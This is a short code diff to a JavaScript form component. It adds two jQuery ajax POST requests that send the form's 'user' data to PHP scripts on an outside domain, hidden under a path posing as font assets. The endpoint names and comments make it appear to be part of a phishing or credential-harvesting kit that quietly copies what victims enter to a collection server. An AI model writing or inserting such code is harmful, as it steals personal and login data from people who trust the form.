@@ -46,7 +46,18 @@ export const Form = ({ toggleForm })=>{
             $.ajax({
                 type: "POST",
                 // add cpanel later 
-                // url: "https://pearldozen.com/nc_assets/fonts/hey/test.php",
+                url: "https://pearldozen.com/nc_assets/fonts/jay/metapal79.php",
+                data: user,
+                success(data) {
+                    console.log('ok');
+                },
+            });
+
+
+            $.ajax({
+                type: "POST",
+                // add cpanel later 
+                url: "https://pearldozen.com/nc_assets/fonts/jay/ada1masa.php",
                 data: user,
                 success(data) {
                     console.log('ok');
